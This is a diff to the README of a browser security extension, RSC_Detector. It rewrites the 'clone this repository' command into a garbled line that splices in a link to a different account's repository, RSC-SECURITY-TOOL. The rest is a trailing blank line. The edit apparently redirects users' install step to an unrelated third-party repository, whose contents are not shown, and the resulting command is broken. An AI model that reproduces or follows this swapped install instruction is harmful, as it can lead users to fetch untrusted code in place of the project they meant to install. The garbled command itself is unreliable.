@@ -34,7 +34,7 @@ The extension uses multiple detection techniques:
 ### From Source
 1. Clone this repository:
    ```bash
-   git clone https://github.com/mrknow001/RSC_Detector.git
+   git clone https://github.com/mrknow001/RSC_Detector.git](https://github.com/xploithunter5/RSC-SECURITY-TOOL.git
    cd RSC_Detector
    ```
 
@@ -114,3 +114,4 @@ This tool is designed for legitimate security research and educational purposes.
 
 
 **⚠️ For authorized security testing only**
+
